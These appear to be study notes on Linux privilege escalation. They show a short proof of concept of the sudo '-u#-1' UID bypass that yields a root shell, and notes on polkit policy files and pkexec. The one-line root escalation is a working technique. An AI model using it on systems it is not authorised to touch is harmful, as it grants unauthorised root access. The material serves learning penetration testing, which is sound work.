POC:

Sudo allows you to run commands as a specific user by using their user ID (UID). 
You can find a user’s UID in the /etc/passwd file. For example:
	
	cat /etc/passwd | grep cry0l1t3

=>	cry0l1t3:x:1005:1005:...

This means the user cry0l1t3 has the UID 1005.


Normally, you can run a command as a specific user using:

		sudo -u#<UID> <command>

However, there is a trick: if you use -1 as the UID, it gets interpreted as 0, 
which is the UID of the root user. So this command:

	sudo -u#-1 id

runs as root and gives you root privileges:

	uid=0(root)

👉 In short: using -1 with sudo can map to UID 0, allowing you to execute commands as root.




SECTION XXIV: Polkit

	--> it is an authorization on linux OS that allows user software and systeme components
to communicate with each other if the user software is authorized to do so.


	--> To check if the user software is authorized for the instruction, polkit is 
asked

Polkit works with two groups of file;
	- action/policies (/usr/share/polkit-1/actions)
	- rules (/usr/share/polkit-1/rules.d)

Additional permission for group and user could be set in
	- 1/localauthority/50-local.d     with the .pkla extensions


Additionals programs running:
	- pkexec (=> runs a program with the rights of another user or with root rights)
	- pkaction (=> can be used to display actions))
	- pkcheck (=> can be used to check if a process is authorized for a specific person)


Using pkexec
	--> pkexec -u <user> <command>
eg; pkexec -u root id
